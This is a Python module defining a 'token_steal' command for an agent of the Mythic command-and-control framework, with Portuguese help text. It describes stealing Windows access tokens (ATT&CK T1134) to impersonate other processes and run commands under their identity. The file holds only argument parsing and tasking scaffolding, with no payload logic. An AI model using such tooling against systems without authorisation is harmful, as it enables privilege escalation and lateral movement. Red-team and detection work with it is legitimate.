from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class TokenStealArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                type=ParameterType.Number,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description="PID do processo alvo. 0 ou vazio = listar tokens disponíveis.",
                default_value=0,
            ),
            CommandParameter(
                name="command",
                type=ParameterType.String,
                parameter_group_info=[ParameterGroupInfo(required=False)],
                description=(
                    "Comando a executar com o token roubado (captura output). "
                    "Vazio = apenas impersonar no thread atual (afeta auth de rede)."
                ),
                default_value="",
            ),
        ]

    async def parse_arguments(self):
        if self.command_line:
            if self.command_line.strip().startswith('{'):
                temp = json.loads(self.command_line)
                self.add_arg("pid",     temp.get("pid", 0))
                self.add_arg("command", temp.get("command", ""))
            else:
                parts = self.command_line.strip().split(" ", 1)
                try:
                    self.add_arg("pid", int(parts[0]))
                except ValueError:
                    self.add_arg("pid", 0)
                self.add_arg("command", parts[1] if len(parts) > 1 else "")
        else:
            self.add_arg("pid",     0)
            self.add_arg("command", "")


class TokenStealCommand(CommandBase):
    cmd         = "token_steal"
    needs_admin = False
    help_cmd    = "token_steal [pid] [command]"
    description = (
        "Access Token Manipulation (T1134). Três modos:\n"
        "  • Sem args          → lista todos os processos com seus token users\n"
        "  • token_steal <pid> → rouba token do PID e impersona no thread atual "
        "(auth de rede SMB/LDAP/WMI passa a usar o token roubado)\n"
        "  • token_steal <pid> <cmd> → executa comando com primary token do PID "
        "e captura output (usa CreateProcessWithTokenW)\n\n"
        "Requer SeImpersonatePrivilege (habilitado automaticamente via RtlAdjustPrivilege). "
        "Para reverter: eval_code ctypes.windll.advapi32.RevertToSelf()"
    )
    version               = 1
    author                = "@wtechsec"
    attackmapping         = ["T1134", "T1134.001", "T1134.002"]
    supported_ui_features = []
    argument_class        = TokenStealArguments
    attributes            = CommandAttributes(
        supported_python_versions=["Python 3.8"],
        supported_os=[SupportedOS.Windows],
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        pid     = task.args.get_arg("pid") or 0
        command = task.args.get_arg("command") or ""

        if int(pid) == 0:
            task.display_params = "list token users"
        elif command:
            task.display_params = "pid={} cmd='{}'".format(pid, command)
        else:
            task.display_params = "impersonate pid={}".format(pid)
        return task

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
